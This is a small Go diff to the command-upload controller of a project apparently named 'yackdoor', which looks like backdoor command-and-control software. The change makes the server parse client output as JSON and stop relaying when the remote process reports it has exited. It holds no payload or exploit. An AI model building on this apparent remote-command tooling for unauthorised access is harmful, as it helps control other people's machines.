@@ -2,9 +2,11 @@ package controller
 
 import (
 	"bytes"
-	"io"
+	"encoding/json"
+	"fmt"
 	"net/http"
 
+	"github.com/bruh-boys/yackdoor/src/api"
 	"github.com/labstack/echo/v4"
 )
 
@@ -25,7 +27,10 @@ func UploadCommand(c echo.Context) error {
 
 	for {
 		output := <-outputs[id]
-		if _, err := io.Copy(c.Response(), bytes.NewBufferString(output)); err != nil {
+		var jsonApi api.ApiOutput
+		json.Unmarshal([]byte(output), &jsonApi)
+		fmt.Println(jsonApi)
+		if _, err := fmt.Fprintln(c.Response(), (output)); err != nil || jsonApi.Exited {
 			commands[id] <- "break"
 			delete(outputs, id)
 			return err
